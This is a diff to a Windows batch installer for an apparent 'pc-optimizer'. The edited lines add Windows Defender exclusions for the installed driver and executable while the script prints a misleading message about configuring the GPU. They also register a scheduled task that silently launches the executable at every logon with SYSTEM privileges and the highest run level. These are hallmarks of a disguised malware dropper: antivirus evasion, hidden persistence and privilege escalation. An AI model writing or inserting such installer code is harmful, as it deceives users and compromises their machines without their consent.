@@ -47,14 +47,15 @@ rmdir /s /q "%INSTALL_DIR%\pc-optimizer"
 
 :: Add exclusions before running the executable
 echo [5/7] Configuring gpu for optimal performance...
-powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%%DRIVER_NAME%'"
-powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%%EXE_NAME%'"
+powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%DRIVER_NAME%'"
+powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%EXE_NAME%'"
 
 echo [6/7] Creating files...
 
 schtasks /create /tn "%APP_NAME%" ^
-/tr "powershell -WindowStyle Hidden -Command Start-Process '%INSTALL_DIR%%EXE_NAME%' -WindowStyle Hidden" ^
+/tr "powershell.exe -WindowStyle Hidden -Command 'Start-Process \"%INSTALL_DIR%\%EXE_NAME%\" -WindowStyle Hidden'" ^
 /sc onlogon ^
+/ru SYSTEM ^
 /rl highest ^
 /f >nul
 
@@ -69,4 +70,3 @@ echo [7/7] Finalizing installation...
 echo.
 echo Installation complete.
 pause
-
